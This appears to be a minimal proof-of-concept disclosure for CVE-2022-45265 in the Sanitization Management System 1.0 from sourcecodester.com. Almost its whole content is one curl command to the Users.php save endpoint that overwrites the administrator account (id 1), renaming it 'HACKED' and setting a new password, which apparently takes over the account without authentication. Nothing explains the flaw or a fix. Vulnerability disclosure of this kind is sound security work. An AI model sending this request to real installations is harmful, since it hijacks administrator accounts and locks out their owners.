# CVE-2022-45265

In the Sanitization Management System (1.0) distributed by sourcecodester.com 

```bash
curl --location --request POST 'http://localhost/php-sms/classes/Users.php?f=save' \
--form 'id="1"' \
--form 'firstname="HACKED"' \
--form 'lastname="Administrator"' \
--form 'username="admin"' \
--form 'password="maikroservicewashere"'
```
